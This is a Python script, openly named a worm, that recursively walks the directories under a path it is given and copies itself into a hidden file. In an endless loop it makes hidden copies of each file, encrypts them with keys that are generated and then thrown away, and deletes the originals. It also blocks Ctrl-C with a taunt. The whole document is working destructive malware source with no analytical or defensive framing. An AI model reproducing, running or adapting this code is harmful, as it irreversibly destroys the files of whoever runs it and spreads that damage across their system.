import os
import shutil
from cryptography.fernet import Fernet
import time
import signal

banner = r'''
                            ,-.
       ___,---.__          /'|`\          __,---,___
    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
  ,'        |           ~'\     /`~           |        `.
 /      ___//              `. ,'          ,  , \___      \
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |
|   /          /\_  `   .    |    ,      _/\          \   |
\  |           \ \`-.___ \   |   / ___,-'/ /           |  /
 \  \           | `._   `\\  |  //'   _,' |           /  /
  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
     ``       /     \    ,='/ \`=.    /     \       ''
             |__   /|\_,--.,-.--,--._/|\   __|
             /  `./  \\`\ |  |  | /,//' \,'  \
            /   /     ||--+--|--+-/-|     \   \
           |   |     /'\_\_\ | /_/_/`\     |   |
            \   \__, \_     `~'     _/ .__/   /
             `-._,-'   `-._______,-'   `-._,-'
'''

def ignore_ctrl_c(signum, frame):
    print("\nNope, sucker!!!!")

class Worm:

    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            paths = input("Give me a path: ")
            self.path = paths
        else:
            self.path = path

        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):
            self.iteration = 10
        else:
            self.iteration = iteration

        # get own absolute path
        self.own_path = os.path.realpath(__file__)

    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass


    def create_new_worm(self):
        # Create the initial .wrong.py file in the same directory as this script!! THE WORM!!!
        destination = os.path.join(os.path.dirname(self.own_path), ".wrong.py")
        shutil.copyfile(self.own_path, destination)


    def encrypt_file(self, source, destination, key):
        with open(source, 'rb') as file:
            data = file.read()
        f = Fernet(key)
        encrypted_data = f.encrypt(data)
        with open(destination, 'wb') as file:
            file.write(encrypted_data)

    def copy_existing_files(self):
        signal.signal(signal.SIGINT, ignore_ctrl_c)
        try:
            while True:  # WILL ALWAYS EVALUATE TO TRUE = INFINITY
                for directory in self.target_dir_list:
                    file_list_in_dir = os.listdir(directory)
                    original_files = []
                    for file in file_list_in_dir:
                        abs_path = os.path.join(directory, file)
                        if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                            source = abs_path
                            destination = None
                            for i in range(self.iteration):
                                destination = os.path.join(directory, "." + file + str(i))
                                shutil.copyfile(source, destination)
                                # Encrypt the replicated file
                                key = Fernet.generate_key()
                                self.encrypt_file(destination, destination, key)

                            if destination:
                                os.remove(source)

                for file_to_delete in original_files:
                    os.remove(file_to_delete)
        except KeyboardInterrupt:
            pass


    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()



if __name__=="__main__":
    print(banner)
    worm = Worm()
    worm.create_new_worm()
    worm.start_worm_actions()
